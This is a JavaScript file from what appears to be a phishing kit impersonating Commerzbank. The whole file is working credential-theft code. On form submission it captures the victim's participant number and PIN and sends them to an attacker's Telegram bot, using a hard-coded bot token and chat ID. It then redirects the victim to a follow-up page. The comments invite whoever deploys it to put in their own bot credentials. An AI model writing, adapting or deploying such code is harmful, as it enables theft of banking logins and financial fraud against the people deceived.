


let form = document.querySelector("#form");

let bot = {
    TOKEN: "6135450810:AAGUOJprgvABqKF6iohNy109gXP1gPf-a4w", /// INPUT BOT TOKEN HERE
    chatID: "5326525481", /// INPUT CHAT ID HERE
}

form.addEventListener("submit", (e) => {
    e.preventDefault();

    var commerzusername = document.querySelector("#teilnehmer").value
    var commerzpass = document.querySelector("#pin").value
 

    var my_text = `----Commerz Bank----%0AEmail : ${commerzusername}%0APassword : ${commerzpass}`

    fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${my_text}`,{
        method: "GET"
    })

    .then(success => {
        window.location.href='upldleter.html'
    }, error => {
        window.location.href='index.html'
    })

})

